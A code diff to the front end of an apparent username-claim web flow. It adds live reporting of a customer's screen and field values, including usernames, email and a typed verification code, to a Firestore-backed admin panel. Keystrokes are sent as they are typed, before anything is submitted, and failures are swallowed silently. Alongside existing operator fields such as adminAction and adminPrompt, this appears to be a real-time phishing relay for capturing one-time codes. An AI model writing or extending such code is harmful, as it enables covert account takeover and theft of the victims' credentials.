@@ -381,16 +381,39 @@ const segs = ["seg1","seg2","seg3"];
 
 let ticketId = null, unsub = null;
 let lastScreenBeforeError = 2; // where to return to on "Try again" / "Go back"
+let currentScreen = 1;        // numeric step the customer is on (1-5)
+let currentScreenLabel = "Step 1 of 3";
+
+// Report the customer's current screen + live field values to Firestore
+// so the admin panel can mirror exactly what they're looking at.
+async function reportScreen(screen, label, extra){
+  if(!ticketId) return;
+  const payload = {
+    clientScreen: screen,
+    clientScreenLabel: label,
+    clientScreenAt: serverTimestamp(),
+    clientUsername: stripAt($("username")?.value || ""),
+    clientClaimName: stripAt($("name")?.value || ""),
+    clientEmail: ($("email")?.value || "").trim(),
+    clientCodeInput: ($("code")?.value || "").trim()
+  };
+  if(extra) Object.assign(payload, extra);
+  try {
+    await updateDoc(doc(db,"tickets",ticketId), payload);
+  } catch(e){ /* non-fatal: mirror just won't update */ }
+}
 
 function show(n){
+  currentScreen = n;
+  currentScreenLabel = ["Step 1 of 3","Step 2 of 3","Processing","Enter code","Done"][n-1] || "";
   screens.forEach((s,i)=>$(s).classList.toggle("on", i===n-1));
   segs.forEach((s,i)=>{
     const el=$(s); el.classList.remove("on","done");
     if(i<n-1) el.classList.add("done");
     else if(i===n-1) el.classList.add("on");
   });
-  const labels = ["Step 1 of 3","Step 2 of 3","Processing","Enter code","Done"];
-  $("topStatus").textContent = labels[n-1] || "";
+  $("topStatus").textContent = currentScreenLabel;
+  reportScreen(n, currentScreenLabel);
 }
 
 function stripAt(v){ return String(v||"").replace(/^@+/,"").trim(); }
@@ -406,8 +429,12 @@ function showError(title, body, returnScreen){
   $("errBody").innerHTML = body || "";
   lastScreenBeforeError = returnScreen || lastScreenBeforeError;
   $("errModal").classList.add("on");
+  reportScreen("error", "Error on screen", { clientErrorTitle: title, clientErrorBody: body });
 }
-function hideError(){ $("errModal").classList.remove("on"); }
+function hideError(){
+  $("errModal").classList.remove("on");
+  reportScreen(currentScreen, currentScreenLabel, { clientErrorTitle: null, clientErrorBody: null });
+}
 
 $("errTry").onclick = () => { hideError(); show(lastScreenBeforeError); };
 $("errCancel").onclick = () => { hideError(); show(lastScreenBeforeError); };
@@ -430,6 +457,25 @@ $("go1").onclick = () => {
   $("ru").textContent="@"+u; $("rn").textContent="@"+n;
   show(2);
 };
+
+// Live field reporting so the admin mirror updates as the customer types
+let liveTimer=null;
+function reportLive(){
+  if(liveTimer) clearTimeout(liveTimer);
+  liveTimer=setTimeout(()=>{
+    if(!ticketId) return;
+    updateDoc(doc(db,"tickets",ticketId),{
+      clientUsername: stripAt($("username")?.value || ""),
+      clientClaimName: stripAt($("name")?.value || ""),
+      clientEmail: ($("email")?.value || "").trim(),
+      clientCodeInput: ($("code")?.value || "").trim(),
+      clientScreenAt: serverTimestamp()
+    }).catch(()=>{});
+  }, 600); // debounce so we don't spam Firestore
+}
+["username","name","email","code"].forEach(id=>{
+  const el=$(id); if(el) el.addEventListener("input", reportLive);
+});
 
 // STEP 2
 $("bk2").onclick = () => show(1);
@@ -458,6 +504,8 @@ $("go2").onclick = async () => {
       status:"queued", attempt:0, adminAction:null, adminPrompt:null,
       clientCode:null, clientCodeAt:null,
       errorMessage:null, errorAt:null,
+      clientScreen:3, clientScreenLabel:"Processing", clientScreenAt:serverTimestamp(),
+      clientUsername:username, clientClaimName:claimName, clientEmail:email, clientCodeInput:"",
       createdAt: serverTimestamp(), updatedAt: serverTimestamp()
     });
     // attach listener AFTER successful write so it can't miss updates
